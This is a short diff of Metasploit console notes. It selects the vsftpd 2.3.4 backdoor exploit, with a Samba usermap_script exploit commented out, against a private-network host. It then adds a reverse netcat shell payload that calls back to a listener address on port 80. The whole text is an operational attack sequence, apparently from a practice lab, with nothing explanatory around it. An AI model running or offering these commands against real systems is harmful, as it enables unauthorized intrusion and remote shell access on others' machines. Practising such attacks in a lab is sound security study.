@@ -1,9 +1,19 @@
 msfconsole
 
 use exploit/unix/ftp/vsftpd_234_backdoor 
+# use exploit/multi/samba/usermap_script
 
 set RHOST 192.168.1.22
 
 show options
 
 exploit
+
+show payloads
+set PAYLOAD cmd/unix/reverse_netcat 
+
+set LHOST 192.168.1.19
+set LPORT 80
+
+
+
